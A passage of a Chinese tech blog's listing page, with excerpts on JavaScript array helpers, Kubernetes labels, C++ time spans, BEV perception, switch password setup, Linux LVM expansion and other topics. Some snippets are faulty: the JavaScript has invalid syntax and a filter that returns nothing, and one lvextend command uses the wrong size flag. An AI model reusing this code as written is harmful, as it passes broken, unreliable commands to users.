		关于js你肯定会用到的方法封装，拿走不谢 1.创建一个模拟数组 const mockdata = function(count){ let result = {"success":true,"msg":'请求成功',"data":[]} //具体的字段最好对应好 (...Array(count).keys()).map(value,key)=&gt;{ this.result.data.push({'name':value,"nick_name":"lala"+value}) } return result } export mockdata 2.把一个二维数组合并成一维数组 let c = b.map(stream==&gt;{return stream.url.match(/\d+/g)}).flat(Infinity) //.flat(Infinity)是把二维数组合并成一维数组**非常的好用。 3.两个数组之间的匹配 return d.filter(channel=&gt;{!c.some(used=&gt;used==channel)}) 4.数组对象的分类，分组方法 const groupBy = (array, f) =&gt; { let groups = {}; array.forEach(function (o) { var group = JSON.stringify(f(o)); groups[group] = groups[group] || []; groups[group].push(o); }); return Object.keys(groups).map(function (group) { return groups[group]; }); }; const arrayGroupBy = (list, groupId) =&gt; { let sorted = groupBy(list, function (item) { return [item[groupId]]; }); return sorted; }; const allUser = arrayGroupBy(data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8f8ba5b0ff7fe6884cc0ac43aea801a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85b75757c49414036bd607fb949f0535/" rel="bookmark">
			k8s--基础--12.5--pod--名称空间,标签,节点名称
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		k8s–基础–12.5–pod–名称空间,标签,节点名称 1、名称空间(namespace) 可以把k8s集群划分成多个名称空间，然后对不同的名称空间的资源做隔离 可以将不同命名空间,当成不同的虚拟主机 可以控制各个名称空间的入栈，出栈策略是一种在多个用户之间划分群集资源的方法 1.1、查看k8s集群当前有哪些名称空间 kubectl get namespace 2、pod标签(pod label) 是多对 key/value key值必须是唯一的 作用： 可以用来划分特定组的对象(比如版本，服务类型等)告诉我们这个Pod是干什么的 标签可以在创建一个对象的时候直接给与，也可以在后期随时修改每一个对象可以拥有多个标签 2.1、查看所有pod资源对象的标签 kubectl get pods --show-labels 2.2、查看拥有web1这个标签的资源对象，并且把标签显示出来 kubectl get pods -l web1 --show-labels 2.3、修改资源的标签 # 给web资源新增标签 K1=V1 kubectl label pods web K1=V1 # 查看 kubectl get pods --show-labels 2.4、k8s的标签选择器 通过标签选择器，客户端/用户能方便辨识出一组对象。目前支持两种标签选择器： 基于等值的标签选择器基于集合的标签选择器 一个label选择器可以由多个条件组成，由逗号分隔。而逗号起着AND逻辑运算符的作用。一个空的label选择器(即有0个必须条件的选择器)会选择集合中的每一个对象。一个null型label选择器(仅对于可选的选择器字段才可能)不会返回任何对象。 2.4.1、基于等值关系的标签选择器 基于相等性或者不相等性的条件允许用label的键或者值进行过滤。支持三种运算符 “=” ：代表相等性“==”：代表相等性“!=”：代表非相等性 案例1 k1=v1 k2!=v2 第1个选择所有键等于k1，值为v1的资源。第2个选择所有键等于k2，值不等于v2的资源，和那些没有键为k2的label的资源。 案例2 k1=v1,k2!=v2 所有键等于k1，值为v1，且键等于k2，值不等于v2的资源
2.4.2、基于集合的标签选择器： 允许用一组值来过滤键。支持三种操作符 innotinexists(仅针对于key符号) 案例1 k1 in (v1, v2) 选择所有键等于k1 ，且值等于v1或者v2的资源。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85b75757c49414036bd607fb949f0535/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f15655e4e261ee91b12334a58e206c76/" rel="bookmark">
			获取时间间隔的几种方法[c&#43;&#43; &amp; c#]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++:
1.COleDateTime操作相关时间间隔：
bool GetTimeSpanVal()
{
COleDateTime m_loss_validdate;
CString tempStr = _T("2022/2/21 14:06:17");
TCHAR CurDir[MAX_PATH] = { 0 };
m_loss_validdate.ParseDateTime(tempStr);
COleDateTimeSpan end_time = COleDateTime::GetCurrentTime() - m_loss_validdate;
if (end_time.GetDays() &gt; 30)
{
cout &lt;&lt; _T("重新校准线损") &lt;&lt; endl;
return false;
}
return true;
}
2 TimeSpan操作：
bool GetTimeSpanValue(const char* tempStr)
{
CTime strTime;
strTime = CTime::GetCurrentTime();
int a, b, c;
sscanf(tempStr, "%4d-%2d-%2d", &amp;a, &amp;b, &amp;c); // tempStr格式：分别为 年 - 月 - 日
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f15655e4e261ee91b12334a58e206c76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/776ec9edfbfcb6480260cfdd4eb728c6/" rel="bookmark">
			史上最全 | BEV感知算法综述（基于图像/Lidar/多模态数据的3D检测与分割任务）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击下方卡片，关注“自动驾驶之心”公众号
ADAS巨卷干货，即可获取
点击进入→自动驾驶之心技术交流群
后台回复【BEV综述】获取论文！
后台回复【ECCV2022】获取ECCV2022所有自动驾驶方向论文！
1摘要 以视觉为中心的俯视图（BEV）感知最近受到了广泛的关注，因其可以自然地呈现自然场景且对融合更友好。随着深度学习的快速发展，许多新颖的方法尝试解决以视觉为中心的BEV感知，但是目前还缺乏对该领域的综述类文章。本文对以视觉为中心的BEV感知及其扩展的方法进行了全面的综述调研，并提供了深入的分析和结果比较，进一步思考未来可能的研究方向。如下图所示，目前的工作可以根据视角变换分为两大类，即基于几何变换和基于网络变换。前者利用相机的物理原理，以可解释性的方式转换视图。后者则使用神经网络将透视图（PV）投影到BEV上。
2BEV感知任务 以视觉为中心的BEV感知指的是基于多个视角的图像序列，算法需要将这些透视图转换为BEV特征并进行感知，如输出物体的3D检测框或俯视图下的语义分割。相比于LiDAR，视觉感知的语义信息更丰富，但缺少准确的深度测量。
最常见的BEV感知便是3D检测，根据输入数据模态的不同，又可以划分为以下三种：
基于图像；
基于LiDAR；
基于多模态。
另一种常见感知是BEV分割：
地图分割（Map Segmentation）;
车道线分割。
3基于几何变换的PV2BEV 传统方案直接利用几何投影将透视图转换为BEV。进一步可以划分为基于同形异体和基于深度的PV2BEV。前者包括简化几何关系的早期工作或仅关注地面感知的近期工作；后者则更适用于实际场景。
基于同形异体的PV2BEV 3D空间中的点可以通过透视映射转换到图像空间，反之则存在困难。逆透视映射（IPM）[1]则解决了上述问题。IPM是将前视图转换为俯视图的开创性工作。该变换利用相机旋转单应性和各向异性缩放[34]，其中单应矩阵可以由相机的内外参推导出来。一些工作[35]使用CNN提取PV图像的语义特征，并估计图像中的垂直消影点和地平面消影线（地平线）来确定单应矩阵。经过IPM操作转换到BEV后，进一步可以进行如光流估计/检测/分割/运动预测/规划等下游任务。VPOE[36]使用Yolov3[37]作为检测主干来估计BEV下的车辆位置和方向。在实际应用中，相机的内外参可能无法获取，TrafCam3D[39] 基于双视角的网络结构提出了一种鲁棒的单应映射，来缓解IPM失真的问题。
但由于IPM极度依赖地面假设（flat-ground assumption，即所有点都在地面上的假设），所以基于IPM的方法通常无法准确检测位于地平面上方的物体，如建筑物、车辆和行人。一些方法利用丰富的语义信息缓解上述问题。OGMs[40]将PV中车辆的历史轨迹转换到BEV上，以遵循单应性的地面假设，进而避免了车身位于地面之上造成的失真。遵循这个想法，BEVStitch[41] 使用双分支来分割车辆和道路的轨迹，并分别通过IPM将它们转换为BEV，之后拼接为完整的BEV路线图。
和上述在预处理或后处理阶段使用IPM不同，也有一些方法将IPM融入到网络的训练中。Cam2BEV[44] 使用 IPM转换每个视角的特征图，从多个车载摄像头获取给定图像的整体BEV语义图。MVNet[45]基于IPM将2D特征投影到共享的BEV空间中，以融合多视角特征，并使用大卷积核来解决行人检测中的遮挡问题。
由于正视图和鸟瞰图之间的差距较大且变形严重，仅使用IPM不足以在BEV中获取无失真的图像或语义图。BridgeGAN[48]将单应视角作为中间视角，并提出了一种基于多个GAN网络的模型来学习PV和BEV之间的交叉视角转换。利用生成式对抗网络（GAN）[49]来增强生成的BEV图像的真实性。
总结 基于同形异体的方法依赖物理映射实现PV2BEV，可解释性强。IPM在下游感知任务的图像投影或特征投影中发挥作用。为了减少失真，语义信息、GAN都被得到了较广泛的应用以提升BEV特征的质量。核心映射通过矩阵乘法进行，不需要学习，简单明朗。但由于PV到BEV的真正转换并不适定（ill-posed），IPM仅通过硬假设解决了部分问题，PV整个特征图的有效BEV映射仍然有待验证和挖掘。下图对相关算法进行了概括总结。
基于深度的PV2BEV 很明显，基于IPM的方法丢失了重要的高度信息。既然降维不行，那么将2D升维到3D便可以解决这个问题。而深度信息可以将2D像素或者特征提升到3D空间中，基于此，基于深度预测的PV2BEV也是一大研究热点。受此启发，本文首先比较这些工作的方法设计，包括视角变换的方法，是否包含深度监督，以及如何与IPM结合等等。
基于点的视角变换 基于深度的PV2BEV方法建立在明确的3D表示上，如上图所示。与基于LiDAR的3D检测一样，可以划分为基于点的方法和基于体素的方法。基于点的方法直接使用深度估计将像素转换为点云，并散射到连续的3D空间中。这种方式更直接、更容易的集成单目深度估计和基于LiDAR的3D检测的成熟经验。开创性的工作Pseudo-LiDAR [53]，如下图所示，首先将深度图转换为伪LiDAR点，然后将其输入到基于LiDAR的3D检测器中。Pseudo-LiDAR++ [54]通过立体深度估计网络和损失函数提高了深度精度。AM3D [55]提出用互补的RGB特征来装饰伪点云。但是，上述方法存在两个通病：
数据泄露问题，验证集和测试集之间的性能差距是由于包含KITTI深度基准的数据泄露造成的[53、57]。
泛化问题，并且由于两个网络之间的梯度截断，在训练和部署期间可能会很复杂。
E2E Pseudo-LiDAR [58] 提出了一个Change-of-Representation（CoR）模块，实现了模型的端到端训练。尽管还有若干工作尝试解决这两个问题，但这种类型的方法本质上不如基于体素的方法，特别是对于大型室外场景。
基于体素的视角变换 与分布在连续3D空间中的点云相比，体素通过将3D空间离散化以构建用于特征变换的规则结构，从而为3D场景理解提供更有效的表示；之后的基于BEV的感知模块也可以直接附加。尽管它牺牲了局部的空间精度，但仍然在覆盖大规模场景结构信息方面更有效，并且与用于视角转换的端到端学习范式兼容。
具体来说，该方案基于深度信息直接在相应的3D位置投射对应的2D特征（而不是点）。先前的工作通过将2D特征图与对应的深度预测结果进行外积来实现。早期的工作假设分布是均匀的，即沿一条射线的所有特征都是相同的，如上图所示[59]。OFT[59]建立了一个内部表示，以确定图像中的哪些特征与鸟瞰图上的位置有关。它在均匀的3D栅格中构建了一个体素特征图，并通过投影对应图像特征来累积填充体素。之后，通过沿y轴对体素特征求和得到正交特征图，后面使用CNN提取BEV特征进行3D目标检测。值得注意的是，对于图像上的每个像素，网络为其分配相同的3D预测表示，即预测深度上的均匀分布。这类方法通常不需要深度监督，并且可以通过端到端的方式在视角转换后学习网络中的深度或3D位置信息。
相比之下，另一种范式显示预测深度分布并用来构建3D特征。如下图所示，LSS[60]预测深度上的分类分布和上下文向量，他们的外积可以确定沿透视射线的每个点的特征，这些特征接近真实的深度分布。此外，其将所有相机的预测结果融到一个场景下，从而减小校准误差。BEVDet [62]遵循了LSS范式，并提出了一个用于从BEV进行多视角相机3D检测的框架，该框架由图像视角编码器、视角转换器、BEV编码器和检测头组成。后续的BEVDet4D [63]在基于多摄像头的3D检测中利用了时间线索。
深度监督 先前的研究表明，当使用预测的深度分布来提升2D特征时，该分布的准确性十分重要。CaDDN[61]（上图b）使用经典方法对从投影LiDAR点派生的稀疏深度图进行插值，并利用它们来监督深度。基于双目3D检测的其他方法，DSGN[64]和LIGA-Stereo[65]（下图）也依赖于类似的监督，实验表明稀疏的LiDAR深度图更有效。其他不使用深度标签的工作只能从稀疏的实例标注中学习这种3D定位或深度信息，这对于网络学习来说要困难得多。除此之外，DD3D[66]和 MV-FCOS3D++[67]指出深度估计和单目3D检测的预训练可以显著增强2D主干的特征表达能力。
与基于IPM的方法相结合 从上面的分析可知，基于IPM的方法适用于平坦的地面场景，并且只需要学习很少的参数便可高效运行。不依赖显示的深度预测和监督的方法适用于沿垂直方向的特征聚合。PanopticSeg[68]利用这两个优点，提出了一个用于全景分割的dense transformer模块，该模块由一个基于IPM的flat transformer和一个对3D空间建模的vertical transformer组成，然后进行错误纠正以生成平面BEV特征。
立体匹配的多视角聚合 除了单目深度估计，立体匹配可以在只有相机的情况下获取更准确的深度信息。其中，最常见的是双目立体匹配，其具有较大的重叠区域和较小的水平偏移。为了比较，之前的工作[60，62]使用多视角配置，例如，环视摄像头安装在自动驾驶汽车上，相邻视角之间的重叠区域通常非常小，这是因为环视相机的主要目标是使用更少的相机覆盖整个空间。在这种情况下，深度估计主要依赖单目，而基于BEV的方法仅在多视角感知的简单性和统一性方面具有优势。
相比之下，双目配置下的深度估计具有更重要的优点。最近的双目算法，如DSGN[64]和LIGA-Stereo[65]，通常使用平面扫描表示进行立体匹配和深度估计。然后从平面扫描特征中对体素和BEV特征进行采样，并进行3D检测。针对多视角设置的其他方法，例如ImVoxelNet[69]，也展示了这种基于体素的方式在室内场景中的有效性，其重叠区域在相邻区域中也更大。
总结 总结来说，基于深度的视角变换方法通常建立在显式3D表示、体素量化或连续3D空间中散射的点云之上。基于体素的方法使用统一的深度向量或显式预测的深度分布将2D特征提升到3D体素空间，并进行BEV感知。相比之下，基于点的方法将深度预测转换为伪LiDAR表示，然后使用自定义网络进行3D检测。下表展示了相关算法的结果：
由上表总结可知：
早期的方法利用伪LiDAR表示在第二阶段使用3D检测器，非端到端的训练方式导致了模型的复杂性并限制了性能；
由于计算效率和灵活性，最近的工作更多关注在基于体素的方法上。这种表示已被广泛应用于不同任务的仅相机方法中。
深度监督对于基于深度的方法很重要，因为在将透视图特征转换为鸟瞰图时，准确的深度分布可以提供必要的信息。
如DfM[70]、BEVDet4D[63]和MVFCOS3D++[67] 中分析的那样，探索此类方法在时间建模中的潜在优势在未来有很大的研究价值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/776ec9edfbfcb6480260cfdd4eb728c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32aeca26d81bf4620118a20365f4f6a9/" rel="bookmark">
			Java FileWriter类的简介说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自:
Java FileWriter类的简介说明
下文讲述FileWriter类的简介说明，如下所示：
FileWriter是文件字符输出流 用于将字符写入到指定的打开的文件中 FileWriter的构造函数
FileWriter(File file) 根据给定的 File 对象构造一个 FileWriter 对象。 FileWriter(File file, boolean append) 根据给定的 File 对象构造一个 FileWriter 对象。 FileWriter(FileDescriptor fd) 构造与某个文件描述符相关联的 FileWriter 对象。 FileWriter(String fileName) 根据给定的文件名构造一个 FileWriter 对象。 FileWriter(String fileName, boolean append) 根据给定的文件名以及指示是否附加写入数据的 boolean 值来构造 FileWriter 对象。 FileWriter的方法
Writer append(char c) 将指定字符添加到此 writer。Writer append(CharSequence csq) 将指定字符序列添加到此 writer。Writer append(CharSequence csq, int start, int end) 将指定字符序列的子序列添加到此 writer.Appendable。abstract void close() 关闭此流，但要先刷新它。abstract void flush() 刷新该流的缓冲。void write(char[] cbuf) 写入字符数组。abstract void write(char[] cbuf, int off, int len) 写入字符数组的某一部分。void write(int c) 写入单个字符。void write(String str) 写入字符串。void write(String str, int off, int len) 写入字符串的某一部分 例:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32aeca26d81bf4620118a20365f4f6a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/978b4154c181a0e6528ac34a9f2d300e/" rel="bookmark">
			Cisco和H3C交换机密码设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cisco 1、设置控制台密码：（打开交换机进入用户模式的密码）
Switch&gt;enable （进入特权模式）
Switch#configure terminal （进入到用户模式）
Switch(config)#line console 0 （进入到控制台）
Switch(config-line)#password cisco123 （设置密码为cisco123）
Switch(config-line)#login （开启密码）
Switch(config-line)#exit
Switch#write （一定要保存配置否则无法生效）
Building configuration...
[OK]
设置进入特权模式的密码
Switch(config)#enable password cisco123 （设置进入特权模式的明文密码为cisco123）
Switch(config)#enable secret cisco123 （设置进入特权模式的密文密码为cisco123）
Switch(config-line)#login （开启密码）
Switch(config-line)#exit
H3C V5平台， console口登陆后
&lt;H3C&gt;system-view
[H3C]local-user admin
[H3C-luser-manage-admin]password simple xxxx
然后quit命令退出，用新密码登录，记得保存
V7平台，console口登陆后
&lt;H3C&gt;system-view
[H3C]local-user admin class manage
[H3C-luser-manage-admin]password simple xxxx
然后quit命令退出，用新密码登录，记得保存（save）
参考网站：Cisco交换机密码设置 - 百度文库
注意：写好配置文件，一定要保存配置
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5de5e1a7b23ae1ab90772788444bd02/" rel="bookmark">
			dump命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用场景 android为我们提供了dump方法。注释中声明该方法会将活动的状态打印到给定流中，当cmd运行“adb shell dumpsys activity”时会调用此函数。所以当我们要做一些测试，就可以在activity重写dump函数编写我们的测试逻辑。
例如这样一个场景：用一个状态控制整个应用的功能是否可用，对于测试员来说她是无法从外部去控制状态值的，这时如果测试员能通过输入一串dump命令就能测试该功能会不会更加方便呢？
如何使用 就上述场景而言，对于开发来说，需要在activity重写dump方法，实现控制逻辑
// cmd执行 adb shell dumpsys activity com.xxx.xxx.activity.MainActivity state，就会执行以下代码 // 解释：com.xxx.xxx是应用包名，.activity.MainActivity是该activity的具体路径 private var mState = false //功能是否禁用 override fun dump(prefix: String, fd: FileDescriptor?, writer: PrintWriter, args: Array&lt;out String&gt;?) { if (args.isNullOrEmpty()) { return } when (args[0]) { "state" -&gt; mState = !mState } } 然后把cmd命令提供给测试就好了。该命令是adb命令，需要安装adb环境
其他 dump除了适用于activity以外，同样也适用于service和contentprovide。cmd唯一的区别是adb shell dumpsys activity …改为adb shell dumpsys activity service … 或者adb shell dumpsys activity service provider …
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/598ae51a5eb4d411b054b91f7ed5d293/" rel="bookmark">
			U盘分配单元大小建议设置多少？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在对U盘进行格式化的时候，需要先进行单元分配，合理单元分配不仅可以提高U盘的读写速度还不会浪费储存空间。下面就来看看U盘分配单元大小设多少最佳的教程。
具体解析如下：
1、首先来说U盘的默认格式化的方式都是FAT32的（FAT32不支持大于4G的文件），或者可以使用exFAT的格式（NTFS分区是采用“日志式”的文件系统，需要记录详细的读写操作，会比较伤闪盘芯片，因为要不断读写。一般不建议U盘使用NTFS分区），exFAT是比较新的一种专门针对移动存储设备的格式化格式，支持单个大于4GB的文件的操作，对于分配单元大小可以简单的说分配的单元的数值越大读写越快，但是存储空间会浪费。
2、所谓分配单元大小，即是系统对磁盘以及移动存储设备进行读写的最小单位。在极限速度以内，分配单元大小设置越大读写速度越快，反之则越慢。但是这里要注意一个问题，单元分配越大越会造成空间的浪费，这就好比你拿许多同样大小的正方形纸片要将一个形状完全覆盖，纸片的面积越大越省事，但是相比于较小的纸片，边缘会有更多的无用面积，磁盘分配单元也是同样的道理。
3、格式化的时候的选择方式建议使用默认数值，系统会为你调节到最匹配的默认数值，无需手动管理，之后选择快速格式化后就立即生效了。当然如果你日常使用的文件一般都较大，那么建议设置的更大些，比如32K甚至是64K。这样会明显的改善写入速度，当然也会浪费更多的空间。
格式为FAT32
格式为NTFS
格式为exFAT
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8af21004e14b3932feefff9848fcf08/" rel="bookmark">
			Linux扩容分区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、增加物理硬盘后，显示当前分区 fdisk -l
通常在你在虚拟机中添加一块新硬盘时，你可能会看到新硬盘没有自动加载（一般会自动加载，当看到新增硬盘后，可跳过此步骤）。需要重新扫描SCSI总线和SCSI设备。
确定主机总线号
ls /sys/class/scsi_host/
结果：
重新扫描SCSI总线来添加设备
for i in $(ls /sys/class/scsi_host/); do echo "- - -" &gt; /sys/class/scsi_host/$i/scan; done
重新显示分区。这时候发现新硬盘已经自动加载了。
fdisk -l
2、创建逻辑卷，将/dev/sdb建立为pv。
可用使用命令：pvcreate /dev/sdb
3、查看lv的信息：lvdisplay
要注意红框中的数据，下面会用到。目前vg的大小是47G.
4、将新建的pv加入到这个VG
执行： vgextend centos /dev/sdb 注意:这里centos 指要扩容的VG的名字，/dev/sdb是指我们刚才创建的逻辑卷的名字。
5、扩容LV
（1）给VL：root增加20G的空间
lvextend -l +20G /dev/centos/root #CentOS （2）给VL：root增加剩余的空间
lvextend -l +100%FREE /dev/centos/root #CentOS
6、重置逻辑卷
扩容完后df -h看不到，需要重置逻辑卷后生效
xfs_growfs /dev/centos/root /dev/centos/root为逻辑卷名称
**全部步骤
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a57fb03667e170c382847535aa5b9cb2/" rel="bookmark">
			小程序云开发入门（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小程序云开发入门（2） 本篇文章主要为大家介绍云开发中云存储和云函数的简单使用方法，如果大家对项目创建，和云数据库的应用或者对本篇文章中的代码有什么疑惑，请参考我的上一篇文章小程序入门开发（1）
一、云存储 用户可以将图片，视频，文本等文件上传到云端，然后调用api将其展现在小程序中。下面以图片的存储作为演示，更多功能请查看官方文档
云存储的简单应用 通过日常生活中我们对各种程序的使用，我们知道在上传图片前，首先需要选择本地的图片，而云存储上传文件的api中需要传递的是小程序临时文件路径，所以在使用云存储上传api前，需要调用wx.chooseImage(）获取图片的临时文件路径，随后将这个路径传入云存储api：wx.cloud.uploadFile()中，将图片上传至云存储。
addPic(上传图片演示) addPic.wxml
&lt;button bindtap="addPic"&gt;上传图片&lt;/button&gt; addPic.js
Page({ addPic(){ let that = this // 从本地选择图片 wx.chooseImage({ count: 1, sizeType: ['original', 'compressed'], sourceType: ['album', 'camera'], success (res) { // tempFilePath可以作为 img 标签的 src 属性显示图片 console.log("上传成功",res) // 云存储上传文件API wx.cloud.uploadFile({ cloudPath: 'new.png', // 上传至云端的路径 filePath: res.tempFilePaths[0], // 小程序临时文件路径 success: e =&gt; { // 返回文件 ID console.log("上传成功",e.fileID) }, fail: console.error }) } }) } }) 从本地选择图片上传
上传后，云存储中可以查看到该图片
二、云函数 什么是云函数？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a57fb03667e170c382847535aa5b9cb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97df826f39e741a8418475e2ca612e7d/" rel="bookmark">
			Java 17新特性，是真的猛，惊呆了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot 正式支持Java 17，Kafka3.0弃用Java8 Spring Boot 2.5.5是Spring Boot 第一个支持Java 17的版本。现在你已经可以从Spring Initializr初始化Spring Boot 支持 java17 版本了。
Java 17 的 14 个 新特性，分别是： 306：恢复始终严格的浮点语义
356：增强型伪随机数发生器
382：新的 macOS 渲染管道
391：macOS/AArch64 端口
398：弃用即将删除的 Applet API
403：强封装JDK的内部API
406：Switch模式匹配（预览）
407：删除 RMI 激活
409：密封类
410：删除实验性 AOT 和 JIT 编译器
411：弃用即将删除安全管理器
412：外部函数和内存 API（孵化器）
414：Vector API（第二次进行特性孵化）
415：特定于上下文的反序列化过滤器
在这14个功能中，哪一个对你最实用。
3年后的首个 LTS版本 据Oracle Java SE支持路线图显示，Java 17 是自Java 11以来的首个长期支持版本。Oracle 还提议将 JDK LTS 发布的节奏从每三年一次改为每两年一次，并且每个LTS 版本的服务时间至少8年以上。Java 版本通常是6个月一更新，时间分别在3月和9月，而这些版本的支持时间基本在半年左右。
据Oralce官博透露，虽然6个月版本的使用人数在增长，但大部分组织及企业更倾向于把LTS版本用在生产环境中，从而得到更加稳定可靠的服务。这一点从Snyk发布的2021 Java 社区报告中也可以得到证实，虽然有 61.5% 的人在生产中使用 Java 11，但仍有一半的 Java 11 用户（目前使用最多的版本）在他们的生产堆栈中使用 Java 8。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97df826f39e741a8418475e2ca612e7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b29e4e2891ebf4fea428966b1d98e6fd/" rel="bookmark">
			【电路基础2】电容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、初始电容 1.1电容的基本原理 电容的功能就是以电场能的形式储存电能量。以平行板电容器为例，简单介绍下电容的基本原理。
如上图所示，在两块距离较近、相互平行的金属平板上(平板之间为电介质)加载一个直流电压；稳定后，与电压正极相连的金属平板将呈现一定量的正电荷，而与电压负极相连的金属平板将呈现相等量的负电荷；这样，两个金属平板之间就会形成一个静电场，所以电容是以电场能的形式储存电能量，储存的电荷量为Q。
电容储存的电荷量Q与电压U和自身属性(也就是电容值C)有关，也就是Q=U*C。根据理论推导，平行板电容器的电容公式如下：
1.2电容的符号 1.3电容的分类与作用 电容是由两个金属极，中间夹有绝缘材料（介质）构成的。由于绝缘材料的不同，所构成的电容器的种类也有所不同。
按结构分：固定电容，可变电容，微调电容；
介质材料分：按介质材料可分为：气体介质电容，液体介质电容，无机固体介质电容，有机固体介质电容。
按极性分为：有极性电容和无极性电容。 我们最常见到的就是电解电容。
电容作用：电容在电路中具有隔断直流电，通过交流电的作用，因此常用于级间耦合、滤波、去耦、旁路及信号调谐等。
1.4电容的单位 电容的基本单位是：F （法），此外还有μF（微法）、nF（用的比较少）pF（皮法），由于电容 F 的容量非常大，所以我们看到的一般都是μF、nF、pF的单位，而不是F的单位。 他们之间的具体换算如下： 1F＝1000 000μF 1μF=1000nF=1000 000pF 1.5电容的耐压值 一个电容都有它的耐压值，这是电容的重要参数之一。
普通无极性电容的标称耐压值有：63V、100V、160V、250V、400V、600V、1000V等；
有极性电容的耐压值相对要比无极性电容的耐压要低，一般的标称耐压值有：4V、6.3V、10V、16V、25V、35V、50V、63V、80V、100V、220V、400V等。 1.6电容的标称及识别法 1. 由于电容体积要比电阻大，所以一般都使用直接标称法。如果数字是0.001，那它代表的是0.001uF＝1nF，如果是10n，那么就是10nF，同样100p就是100pF。
2. 不标单位的直接表示法：用1~4位数字表示，容量单位为pF，如350为350pF，3为3pF，0.5为0.5pF
3. 色码表示法：沿电容引线方向，用不同的颜色表示不同的数字，第一， 二种环表示电容量，第三种颜色表示有效数字后零的个数（单位为pF）。
颜色意义：黑=0、棕=1、红=2、橙=3、黄=4、绿=5、蓝=6、紫=7、灰=8、白=9。
二、电容的工艺与结构 根据电容公式，电容量的大小除了与电容的尺寸有关，与电介质的介电常数(Permittivity)有关。电介质的性能影响着电容的性能，不同的介质适用于不同的制造工艺。
电容的制造工艺主要可以分为三大类：
· 薄膜电容(Film Capacitor)
· 电解电容(Electrolytic Capacitor)
· 陶瓷电容(Ceramic Capacitor)
2.1 薄膜电容(Film Capacitor) Film Capacitor在国内通常翻译为薄膜电容，但和Thin Film工艺是不一样的。
薄膜电容是通过将两片带有金属电极的塑料膜卷绕成一个圆柱形，最后封装成型；由于其介质通常是塑料材料，也称为塑料薄膜电容；其内部结构大致如下图所示：
薄膜电容根据其电极的制作工艺，可以分为两类：
金属箔薄膜电容(Film/Foil)
金属箔薄膜电容，直接在塑料膜上加一层薄金属箔，通常是铝箔，作为电极；这种工艺较为简单，电极方便引出，可以应用于大电流场合。
金属化薄膜电容(Metallized Film)
金属化薄膜电容，通过真空沉积(Vacuum Deposited)工艺直接在塑料膜的表面形成一个很薄的金属表面，作为电极；由于电极厚度很薄，可以绕制成更大容量的电容；但由于电极厚度薄，只适用于小电流场合。
金属化薄膜电容就是具有自我修复的功能，即假如电容内部有击穿损坏点，会在损坏处产生雪崩效应，气化金属在损坏处将形成一个气化集合面，短路消失，损坏点被修复；因此，金属化薄膜电容可靠性非常高，不存在短路失效；
薄膜电容有两种卷绕方法：有感绕法在卷绕前，引线就已经和内部电极连在一起；无感绕法在绕制后，会采用镀金等工艺，将两个端面的内部电极连成一个面，这样可以获得较小的ESL，应该高频性能较高；此外，还有一种叠层型的无感电容，结构与MLCC类似，性能较好，便于做成SMD封装。
最早的薄膜电容的介质材料是用纸浸注在油或石蜡中，英国人D'斐茨杰拉德于1876年发明的；工作电压很高。现在多用塑料材料，也就是高分子聚合物，根据其介质材料的不同，主要有以下几种： 2.2 电解电容(Electrolytic Capacitor) 电解电容是用金属作为阳极(Anode)，并在表面形成一层金属氧化膜作为介质；然后湿式或固态的电解质和金属作为阴极(Cathode)。电解电容大都是有极性的，如果阴极侧的金属，也有一层氧化膜，就是无极性的电解电容。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b29e4e2891ebf4fea428966b1d98e6fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6245dc700887d077dd7d4130d3862fb9/" rel="bookmark">
			误差状态卡尔曼滤波(error-state Kalman Filter)，扩展卡尔曼滤波，实现GPS&#43;IMU融合，EKF ESKF GPS&#43;IMU
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
